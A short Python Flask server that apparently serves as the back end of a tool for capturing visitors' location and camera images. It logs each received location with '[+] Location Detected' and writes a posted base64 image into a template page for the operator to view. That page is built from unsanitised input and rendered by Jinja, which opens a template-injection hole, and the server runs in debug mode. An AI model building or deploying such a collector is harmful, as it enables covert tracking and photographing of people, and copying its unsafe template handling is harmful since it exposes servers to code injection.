from flask import Flask, render_template, request
import base64

app=Flask(__name__,template_folder='template')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/image')
def image():
    return render_template('image.html')

@app.route('/api/data/<location>', methods=['GET'])
def get_data(location):
    print("[+] Location Detected {"+location+"}")
    data = {'message': 'Location Received In Server'}
    return data

@app.route('/api/data', methods=['POST'])
def post_data():
    request_data = request.get_json()
    image = request_data["image"]
    decodedData = "<img src='"+image+"'>"
    imgFile = open('template/image.html', 'w')
    imgFile.write(decodedData)
    imgFile.close()
    print("[+] Image saved run (url/image) in browser to get data")
    response_data = {'message': 'This is a POST request', 'data': request_data}
    return response_data

if __name__ == '__main__':
    app.run(debug=True)
